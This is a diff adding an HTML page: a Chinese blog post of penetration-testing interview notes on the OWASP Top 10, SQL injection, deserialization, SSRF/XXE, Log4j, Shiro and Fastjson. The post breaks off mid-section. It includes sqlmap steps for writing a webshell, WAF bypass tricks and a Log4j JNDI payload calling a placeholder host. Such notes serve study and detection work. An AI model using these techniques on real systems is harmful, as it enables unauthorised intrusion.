@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>王的小屋 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `王的小屋`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="http://example.com/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"","path":"2024/07/06/MySql数据库注入/"},{"title":"Hello World","path":"2024/07/05/hello-world/"},{"title":"","path":"2024/07/06/hw培训/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">love睡觉 .</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">cc</span>
+          <span class="main-left--tag">宅</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>0</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>3 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title"></h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2024-07-06 20:41:56</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><ol>
+<li>渗透思路是什么</li>
+<li>信息收集思路</li>
+<li>攻击成功有哪些特征</li>
+<li>cdn绕过</li>
+<li>给你个登录口你怎么办</li>
+<li>挖过SRC吗</li>
+<li>说说SRC挖掘经历</li>
+</ol>
+<h2 id="OWASP-top10"><a href="#OWASP-top10" class="headerlink" title="OWASP top10"></a>OWASP top10</h2><hr>
+<ul>
+<li>SQL 注入</li>
+<li>失效的身份认证和会话管理<ul>
+<li>在退出、密码管理、超时、密码找回、帐户更新等方面存在漏洞</li>
+<li>修复：支持密码有效期、能够禁用帐户、不要存储用户密码、要求使用强密码、使用 SSL 保护会话身份验证 Cookie、限制会话寿命</li>
+</ul>
+</li>
+<li>跨站脚本攻击 XSS<ul>
+<li>DOM型依赖的是浏览器端的DOM解析</li>
+<li>HttpOnly：禁止js获取cookie</li>
+</ul>
+</li>
+<li>直接引用不安全的对象<ul>
+<li>例如,可能出现URL中调用资源处能通过..&#x2F;..&#x2F;方式访问其他目录资源,实现任意文件读取的问题</li>
+</ul>
+</li>
+<li>安全配置错误<ul>
+<li>不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息</li>
+</ul>
+</li>
+<li>敏感信息泄露<ul>
+<li>需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据</li>
+</ul>
+</li>
+<li>缺少功能级的访问控制<ul>
+<li>未授权访问</li>
+</ul>
+</li>
+<li>跨站请求伪造 CSRF</li>
+<li>使用含有已知漏洞的组件</li>
+<li>未验证的重定向和转发<ul>
+<li>钓鱼网站常用</li>
+<li>与ssrf不同,ssrf是调用外网无法访问的内网资源</li>
+</ul>
+</li>
+</ul>
+<h3 id="top10相关问题"><a href="#top10相关问题" class="headerlink" title="top10相关问题"></a>top10相关问题</h3><ul>
+<li>你了解OWASP TOP10漏洞吗？</li>
+<li>简单介绍一下&#x2F;有哪十个？</li>
+</ul>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><hr>
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul>
+<li>web应用程序对用户输入的数据过滤不严,导致用户输入的数据被当做SQL语句执行</li>
+</ul>
+<h3 id="类型有哪些"><a href="#类型有哪些" class="headerlink" title="类型有哪些"></a>类型有哪些</h3><ul>
+<li>反馈结果来看<ul>
+<li>有回显</li>
+<li>无回显</li>
+</ul>
+</li>
+<li>攻击手法<ul>
+<li>联合 union select</li>
+<li>报错<ul>
+<li>updatexml、ExtractValue<ul>
+<li>第二个参数需要xpath格式的字符串,传入的参数格式不符合要求时会报错</li>
+</ul>
+</li>
+<li>floor<ul>
+<li>插入重复主键导致报错</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>盲注<ul>
+<li>布尔（看返回的页面是否一致）和时间（看服务器响应时间）</li>
+<li>常用函数<ul>
+<li>if</li>
+<li>sleep</li>
+<li>benchmark</li>
+<li>get_lock</li>
+<li>substr</li>
+<li>ascii&#x2F;ord</li>
+<li>char</li>
+<li>length</li>
+<li>concat</li>
+<li>groupconcat</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>宽字节注入<ul>
+<li>后端代码和数据库编码格式不一致,gbk会把两个字节转为一个中文字符。PHP会对单引号进行转义,单引号前加%df会被PHP改为 %df%5c单引号,可以绕过转义</li>
+</ul>
+</li>
+<li>二次注入<ul>
+<li>后端代码将用户输入的内容存进数据库时没有转义,取出时形成闭合导致注入</li>
+</ul>
+</li>
+<li>堆叠注入<ul>
+<li>拼接SQL语句，加分号断开，和服务器端的SQL语句形成闭合，然后在后面接着写SQL语句，服务器端接收后会继续在数据库执行</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>注入点<ul>
+<li>数字（and 1&#x3D;1这种）</li>
+<li>字符（需要单引号闭合这种）</li>
+<li>搜索（需要%或者_当做占位符这种）</li>
+</ul>
+</li>
+<li>传递方式<ul>
+<li>get</li>
+<li>post</li>
+<li>cookie</li>
+<li>ua头&#x2F;referer</li>
+<li>host</li>
+</ul>
+</li>
+</ul>
+<h3 id="写入shell条件"><a href="#写入shell条件" class="headerlink" title="写入shell条件"></a>写入shell条件</h3><ul>
+<li>知道web的绝对路径</li>
+<li>当前用户有文件写入和删除的权限</li>
+<li>secure_file_priv函数不为空,文件导出路径与web路径重叠</li>
+<li>PHP关闭魔术引号，php主动转义功能关闭</li>
+</ul>
+<h3 id="写入shell方式"><a href="#写入shell方式" class="headerlink" title="写入shell方式"></a>写入shell方式</h3><ul>
+<li>通过本地写入,into outfile函数,用到web绝对路径</li>
+<li>通过sqlmap –os-shell命令写入<ul>
+<li>确认注入点是否为root权限<ul>
+<li>sqlmap -u 网址 –is-dba</li>
+</ul>
+</li>
+<li>探知网站绝对路径<ul>
+<li>sqlmap -u 网址 –sql-shell</li>
+<li>然后再在sql-shell中直接使用sql命令读取数据库文件存放路径<ul>
+<li>sql-shell&gt; select @@datadir;</li>
+</ul>
+</li>
+<li>然后通过数据库文件的位置对网站所在的绝对路径进行猜测，如通过不同操作系统&#x2F;中间件&#x2F;服务器搭建方式判断网站根目录</li>
+</ul>
+</li>
+<li>写入shell<ul>
+<li>sqlmap -u 网址 –os-shell</li>
+<li>选择语言后,选择可写目录,选择自定义目录后手动输入获得的网站绝对路径,拿到shell</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h3><ul>
+<li>对关键函数或字符过滤如 ：union select order by information_schema 等</li>
+<li>pdo预处理，使用预编译语句</li>
+<li>对数据库给与最小权限</li>
+<li>增加waf 安全设备 防火墙等</li>
+</ul>
+<h3 id="SQL注入绕过waf"><a href="#SQL注入绕过waf" class="headerlink" title="SQL注入绕过waf"></a>SQL注入绕过waf</h3><ul>
+<li>大小写双写</li>
+<li>使用编码：unicode编码 十六进制编码 url编码</li>
+<li>等价函数 如：mid，substr（） &#x3D;&#x3D;&gt;substring（） &amp;&amp;和||&#x3D;&#x3D;&gt; and 和or &#x3D;号可以用&lt;&gt;因为如果不大于不小于就是等于</li>
+<li>内联注释</li>
+<li>更换提交方式</li>
+<li>垃圾数据</li>
+<li>参数污染等等方式</li>
+</ul>
+<h3 id="SQL注入相关问题"><a href="#SQL注入相关问题" class="headerlink" title="SQL注入相关问题"></a>SQL注入相关问题</h3><ul>
+<li>SQL注入形成的原因是什么？</li>
+<li>SQL注入分为哪几种类型？</li>
+<li>SQL注入常用函数</li>
+<li>一个站点存在时间盲注，但是sleep不能用，可以用哪些函数？</li>
+<li>SQL注入报错注入函数</li>
+<li>SQL注入无回显怎么办？</li>
+<li>SQL注入如何防御SQL注入？</li>
+<li>SQL注入如何绕过WAF？（说出你知道的SQL注入bypass WAF的方式）</li>
+<li>sqlmap进行SQL注入的命令是什么？</li>
+<li>sqlmap进行SQL注入的方式有哪些？</li>
+<li>SQL注入写shell的条件有哪些？</li>
+<li>SQL注入如何写shell？</li>
+<li>SQL盲注怎么判断有没有成功？</li>
+<li>SQL注入如何写shell？</li>
+</ul>
+<h4 id="引申"><a href="#引申" class="headerlink" title="引申"></a>引申</h4><ul>
+<li><p>MySQL5.0以上和5.0以下有什么区别？</p>
+</li>
+<li><p>SQL注入流程</p>
+</li>
+<li><p>SQL注入写shell，除了into outfile还有什么？into dumpfile</p>
+</li>
+<li><p>如何判断一条告警是不是SQL注入？</p>
+</li>
+<li><p>如何判断SQL注入告警是不是业务流量？</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/112541157">MySQL提权方式</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/112858836">SqlServer提权方式</a></p>
+</li>
+<li><p>存在预处理的情况下是否还会出现SQL注入？</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ljfrocky/article/details/133356906">预处理</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46709219/article/details/111188998">SQL注入如何读文件？</a></p>
+</li>
+</ul>
+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><hr>
+<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>把对象变成一个可以传输的字符串,为了方便传输.PHP文件在执行结束后会销毁对象,但有时候可能会用到销毁的了的对象,重复调用代码比较麻烦,于是有了序列化和反序列化,可以把一个实例化对象长久的存在计算机磁盘上,调用的时候拿出来反序列化即可</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>反序列化内容用户可控,且后台不正当地使用了魔术方法,使用户可以构造一个恶意的序列化字符串</p>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p>基本都是白盒测试，需要拿到代码,确定unserialize函数参数可控,然后看这些代码有哪些类,类中有哪些魔术方法,可以随着对象的创建或者销毁等操作调用哪些魔术方法,看魔术方法中有没有可以让我们利用的点,看类中有哪些参数可以通过反序列化修改,结合这些可以修改的参数和魔术方法中的利用点进行反序列化漏洞的利用</p>
+<h3 id="PHP反序列化相关问题"><a href="#PHP反序列化相关问题" class="headerlink" title="PHP反序列化相关问题"></a>PHP反序列化相关问题</h3><ul>
+<li>简单介绍一下PHP反序列化漏洞</li>
+</ul>
+<h4 id="引申-1"><a href="#引申-1" class="headerlink" title="引申"></a>引申</h4><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15660517.html">PHP存在哪些危险函数？</a></p>
+<p>eval(),  exec(),  shell_exec(),  system(),  file(), unlink(),  fopen(),  fread()</p>
+</li>
+<li><p>PHP造成文件下载漏洞的函数知道吗？</p>
+<p>readfile(),  fpassthru(),  file_get_contents(),  fread()</p>
+</li>
+<li><p>PHP造成文件包含漏洞的常用函数有哪四个？区别是什么？</p>
+<p>include(),  include_once(),  require(),  require_once()</p>
+<ul>
+<li><code>include()</code>：在文件包含失败时会生成一个警告（E_WARNING），脚本继续执行。</li>
+<li><code>require()</code>：在文件包含失败时会生成一个致命错误（E_COMPILE_ERROR），脚本停止执行。</li>
+<li><code>include_once()</code>：在文件包含失败时行为与 <code>include()</code> 相同，但是它会检查文件是否已被包含，如果已经包含则不会再次包含。</li>
+<li><code>require_once()</code>：在文件包含失败时行为与 <code>require()</code> 相同，但它会检查文件是否已被包含，如果已经包含则不会再次包含。</li>
+</ul>
+</li>
+<li><p>PHP的%00截断知道吗？</p>
+<p>利用 <code>%00</code> 截断（NULL 字节截断）来绕过文件名验证</p>
+</li>
+<li><p>Java存在哪些危险函数？</p>
+<ol>
+<li><code>Runtime.exec()</code>：用于执行外部系统命令，如果未正确验证用户输入，可能导致命令注入漏洞。</li>
+<li><code>ProcessBuilder.command()</code>：类似于 <code>Runtime.exec()</code>，也用于执行外部系统命令。</li>
+<li><code>File.delete()</code>：用于删除文件，如果未正确验证用户输入，可能导致任意文件删除漏洞。</li>
+<li><code>FileInputStream/FileOutputStream</code>：用于读写文件，如果未正确处理文件路径，可能导致文件操作漏洞。</li>
+<li><code>ObjectInputStream/ObjectOutputStream</code>：用于对象的序列化和反序列化，如果处理不当，可能导致反序列化漏洞。</li>
+</ol>
+</li>
+<li><p>Java反序列化知道吗？</p>
+<p>Java 反序列化是指将序列化的对象转换回原始的 Java 对象的过程。在 Java 中，可以使用 <code>ObjectInputStream</code> 类的 <code>readObject()</code> 方法来反序列化对象。反序列化常用于网络通信、持久化存储等场景。</p>
+</li>
+</ul>
+<h2 id="XSS-CSRF-SSRF"><a href="#XSS-CSRF-SSRF" class="headerlink" title="XSS&#x2F;CSRF&#x2F;SSRF"></a><strong>XSS&#x2F;CSRF&#x2F;SSRF</strong></h2><hr>
+<h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>跨站脚本攻击</p>
+<p>服务器对用户输入的数据过滤不严，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。常用于盗取cookie、劫持会话、篡改网页内容等</p>
+<p>漏洞分为三种：反射型、存储型、DOM型，反射型和DOM型的恶意代码存在URL里，存储型恶意代码存在服务器里，其中DOM型xss是通过浏览器调用执行恶意代码，通过js改变html造成xss攻击</p>
+<h3 id="xss、csrf漏洞、ssrf漏洞的区别"><a href="#xss、csrf漏洞、ssrf漏洞的区别" class="headerlink" title="xss、csrf漏洞、ssrf漏洞的区别"></a>xss、csrf漏洞、ssrf漏洞的区别</h3><p>csrf：跨站请求伪造</p>
+<p>ssrf：服务器请求伪造</p>
+<p>xss漏洞通常用于盗取cookie，csrf是因为对请求包的来源校验不严，通过利用盗取的用户cookie伪造用户身份，进行信息盗取或者修改，所以叫跨站请求伪造，ssrf是服务器请求伪造，是服务器对用户提供的URL过于信任，导致攻击者可以通过该漏洞访问到外网访问不到的内网资源，或者攻击内网，或攻击其他访问不到的服务器</p>
+<h3 id="xxe漏洞了解吗？"><a href="#xxe漏洞了解吗？" class="headerlink" title="xxe漏洞了解吗？"></a>xxe漏洞了解吗？</h3><p>外部实体注入漏洞，应用程序在解析xml输入时，没有禁止外部实体的加载，导致可以加载外部恶意xml文件，造成文件读取、命令执行、攻击内网等危害</p>
+<h3 id="xss-csrf-ssrf-xxe漏洞相关问题"><a href="#xss-csrf-ssrf-xxe漏洞相关问题" class="headerlink" title="xss&#x2F;csrf&#x2F;ssrf&#x2F;xxe漏洞相关问题"></a>xss&#x2F;csrf&#x2F;ssrf&#x2F;xxe漏洞相关问题</h3><ul>
+<li><p>xss&#x2F;csrf&#x2F;ssrf三者名字分别是什么？</p>
+<p>跨站脚本攻击&#x2F;跨站请求伪造攻击&#x2F;服务器请求伪造攻击</p>
+</li>
+<li><p>xss&#x2F;csrf&#x2F;ssrf三者区别是什么？</p>
+<p>xss常用来盗取cookie，</p>
+</li>
+<li><p>xss有哪三种类型？区别是什么？</p>
+</li>
+<li><p>介绍一下xxe漏洞</p>
+</li>
+<li><p>xxe无回显怎么办？</p>
+</li>
+<li><p>xss和xxe有什么区别？</p>
+</li>
+<li><p>如何防御xss？httponly</p>
+</li>
+<li><p>xss盗取cookie的原理？document.cookie</p>
+</li>
+<li><p>xss绕过过滤方法</p>
+</li>
+<li><p>可能存在xss的地方有哪些？</p>
+</li>
+<li><p>csrf成因及危害</p>
+</li>
+<li><p>如何防御csrf？</p>
+</li>
+<li><p>如何利用csrf漏洞？</p>
+</li>
+<li><p>ssrf成因及危害</p>
+</li>
+<li><p>ssrf可能用到哪些协议？</p>
+<ul>
+<li>http,file,dict,ftp,gopher</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">ssrf可能存在于哪些地方？</a></p>
+</li>
+<li><p>ssrf如何进行内网探测？<a target="_blank" rel="noopener" href="http://127.0.0.1:3306/">http://127.0.0.1:3306</a></p>
+</li>
+<li><p>ssrf进行内网探测常用哪些协议？</p>
+</li>
+<li><p>ssrf如何防御？</p>
+</li>
+<li><p>ssrf如和bypass？</p>
+</li>
+</ul>
+<h4 id="引申-2"><a href="#引申-2" class="headerlink" title="引申"></a>引申</h4><ul>
+<li>什么是同源策略？</li>
+<li>httponly如何绕过？</li>
+<li>xss如何进行权限维持？</li>
+<li>常用的文件读取协议有哪些？</li>
+</ul>
+<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><hr>
+<h3 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h3><hr>
+<h4 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h4><p>该漏洞主要是由于日志在打印时当遇到${后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。受影响版本为2.0 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1,2.15.0-rc2不受影响</p>
+<h4 id="强特征"><a href="#强特征" class="headerlink" title="强特征"></a>强特征</h4><p>攻击者发送的数据包中可能存在${}字样，常用jndi注入，有时候出现在ua头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi: ldap://xxx.xxx.xxx.xxx:53/c&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h4><p>常用dns平台进行漏洞探测，如dnslog和ceye.io，之后在自己的vps上用jndi注入器构造监听payload，注入器会同时打开本机的rmi或者ldap服务，然后另起终端，用nc开启对payload中设置的监听端口的监听，然后把jndi注入器返回的rmi或ldap服务链接用get或post或ua头的方式，用${jndi:rmi:&#x2F;&#x2F;}构造payload提交</p>
+<h4 id="其他可用服务"><a href="#其他可用服务" class="headerlink" title="其他可用服务"></a>其他可用服务</h4><p>jndi、ldap、rmi、jrmp、jmx、jms等</p>
+<h4 id="Log4j相关问题"><a href="#Log4j相关问题" class="headerlink" title="Log4j相关问题"></a>Log4j相关问题</h4><ul>
+<li>介绍一下Log4j漏洞</li>
+<li>Log4j流量特征是什么？</li>
+<li>Log4j有哪些可用服务？</li>
+<li>攻击成功的特征是什么？</li>
+</ul>
+<h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><hr>
+<h4 id="简述-2"><a href="#简述-2" class="headerlink" title="简述"></a>简述</h4><p>shiro框架提供了rememberme功能，用户登录成功后会生成通过序列化、AES加密、base64加密形成的cookie，攻击者可以通过解密得到AES编码，其中shiro550的AES密钥为硬编码，可以尝试字典破解得到加密前的序列化字符串，直接进行修改,然后加密替换原来的cookie，shiro721的AES加密使用的是CBC模式，可以用ysoserial生成包含恶意 payload的class，通过padding oracle工具对cookie进行爆破，并替换为生成的class，将padding oracle攻击工具生成的cookie替换原来的cookie达到反序列化并命令执行漏洞的利用</p>
+<h4 id="COOKIE加解密流程"><a href="#COOKIE加解密流程" class="headerlink" title="COOKIE加解密流程"></a>COOKIE加解密流程</h4><p>序列化、AES加密、base64加密形成cookie，解密过程相反</p>
+<h4 id="强特征-1"><a href="#强特征-1" class="headerlink" title="强特征"></a>强特征</h4><p>请求包cookie中有RememberMe字段,返回包中包含rememberMe&#x3D;deleteMe字段</p>
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>shiro550：去掉或者替换默认密钥，升级shiro版本</p>
+<p>shiro721：升级shiro版本</p>
+<h4 id="Shiro相关问题"><a href="#Shiro相关问题" class="headerlink" title="Shiro相关问题"></a>Shiro相关问题</h4><ul>
+<li>介绍一下Shiro漏洞</li>
+<li>Shiro的加密流程和解密流程是什么？</li>
+<li>Shiro有哪些流量特征？</li>
+<li>如何判断一个网站是否用Shiro</li>
+</ul>
+<h5 id="引申-3"><a href="#引申-3" class="headerlink" title="引申"></a>引申</h5><ul>
+<li>Shiro550和Shiro721的区别</li>
+<li>Shiro550攻击的前提是什么？</li>
+<li>Shiro721攻击的前提是什么？</li>
+<li>Shiro721攻击要注意什么？</li>
+<li>Shiro721攻击的原理是什么？</li>
+</ul>
+<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><hr>
+<h4 id="简述-3"><a href="#简述-3" class="headerlink" title="简述"></a>简述</h4><p>在请求包里构造恶意的json格式payload，漏洞在处理json对象时没有对@type字段进行过滤，导致攻击者可以传入恶意的TemplateImpl类，通过该类的_bytecodes字段生成Java实例，执行构造函数。</p>
+<h4 id="识别fastjson方法"><a href="#识别fastjson方法" class="headerlink" title="识别fastjson方法"></a>识别fastjson方法</h4><p>正常请求为get且没有请求体，抓包，改提交方式为post，content-type字段改为application&#x2F;json，提交内容为json格式，大括号不闭合，返回包会出现fastjson。该方法可屏蔽，屏蔽则用dns盲打</p>
+<h4 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h4><p>@type，加一个恶意类和命令，content-type字段为application&#x2F;json</p>
